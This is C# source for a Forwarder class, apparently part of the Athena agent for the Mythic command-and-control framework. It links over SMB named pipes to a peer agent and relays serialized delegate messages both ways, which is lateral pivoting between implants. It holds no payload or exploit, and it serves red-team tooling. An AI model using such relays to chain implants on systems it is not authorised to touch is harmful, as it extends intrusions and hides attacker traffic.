﻿using Athena.Models.Mythic.Response;
using Athena.Utilities;
using H.Pipes;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class Forwarder
    {
        public bool connected { get; set; }
        public ConcurrentBag<DelegateMessage> messageOut { get; set; }
        private PipeClient<string> clientPipe { get; set; }
        private object _lock = new object();

        public Forwarder()
        {
            this.messageOut = new ConcurrentBag<DelegateMessage>();
        }

        public List<DelegateMessage> GetMessages()
        {
            List<DelegateMessage> messagesOut;
            lock (_lock)
            {
                messagesOut = new List<DelegateMessage>(this.messageOut);
                this.messageOut.Clear();
            }

            return messagesOut;
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(string host, string pipename)
        {
            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    this.clientPipe = new PipeClient<string>(pipename, host);
                    this.clientPipe.MessageReceived += (o, args) => AddMessageToQueue(args.Message);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;
                        return true;
                    }
                    else { return false; }
                }
                else { return false; }
            }
            catch { return false; }
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                this.clientPipe.WriteAsync(JsonConvert.SerializeObject(dm));
                return true;
            }
            catch
            {
                return false;
            }
        }
        private void AddMessageToQueue(string message)
        {
            DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(message);

            lock (_lock)
            {
                this.messageOut.Add(dm);
            }
        }

        //Unlink from the named pipe
        public bool Unlink()
        {
            try
            {
                this.clientPipe.DisconnectAsync();
                this.connected = false;
                this.clientPipe.DisposeAsync();
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
    }
}
